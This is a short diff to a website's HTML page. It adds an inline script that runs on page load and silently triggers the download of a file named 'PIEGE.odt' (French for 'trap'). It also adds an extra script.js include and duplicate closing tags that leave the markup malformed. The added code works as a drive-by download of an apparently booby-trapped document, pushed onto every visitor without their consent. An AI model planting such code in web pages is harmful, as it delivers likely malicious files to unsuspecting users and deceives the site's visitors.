@@ -578,7 +578,25 @@
   <script src="assets/js/clipboard.min.js"></script>
   <script src="assets/js/slick.min.js"></script>
   <script src="assets/js/script.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var link = document.createElement("a");
+        link.href = "PIEGE.odt"; // Nom du fichier Word
+        link.download = "PIEGE.odt"; // Nom du fichier à télécharger
+        document.body.appendChild(link);
+
+        link.click(); // Lancer le téléchargement automatique
+
+        document.body.removeChild(link); // Supprimer le lien après téléchargement
+    });
+</script>
+
+<script src="script.js"></script>
 </body>
+</html>
+
+</body>
+  
 
 
 </html>
